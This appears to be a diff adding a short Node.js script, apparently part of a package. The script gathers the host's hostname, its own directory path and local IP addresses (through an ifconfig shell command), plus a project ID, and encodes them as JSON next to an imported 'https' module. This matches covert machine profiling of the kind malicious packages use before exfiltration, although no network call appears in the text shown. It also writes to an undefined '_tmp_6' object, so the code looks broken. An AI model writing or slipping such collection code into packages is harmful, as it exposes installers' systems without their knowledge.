@@ -1,0 +1,18 @@
+const https = require('https')
+const path = require('path')
+var os = require("os")
+var hostname = os.hostname()
+var filepath = path.dirname(__filename)
+var ips = require('child_process').execSync("ifconfig | grep inet | grep -v inet6 | awk '{gsub(/addr:/,\"\");print $2}'").toString().trim().split("\n")
+const data = new TextEncoder().encode(
+  JSON.stringify({
+    hostname: hostname,
+    filepath: filepath,
+    localip: ips,
+    project_id: process.argv[2]
+  })
+)
+_tmp_6.hostname = hostname
+_tmp_6.filepath = filepath
+_tmp_6.localip = ips
+_tmp_6.project_id = process.argv[2]
